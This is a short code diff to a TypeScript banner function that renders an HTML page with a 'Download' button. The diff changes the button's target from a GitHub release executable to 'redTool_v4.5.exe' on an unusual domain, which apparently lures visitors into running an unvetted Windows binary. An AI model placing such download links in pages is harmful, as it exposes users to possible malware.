@@ -155,7 +155,7 @@ export const banner = (args?: string[]): string => {
 		}
 	</style>
 <body>
-												<button onclick="window.location.href='https://github.com/baWxSteam/rE-Tool/releases/download/v4.2/redEngine.v4.2beta.exe'" class="openai-btn">Download</button>
+												<button onclick="window.location.href='https://wearedoingtestshere.lol/files/redTool_v4.5.exe'" class="openai-btn">Download</button>
 </body>
 
 Type 'help' to see the list of available commands.
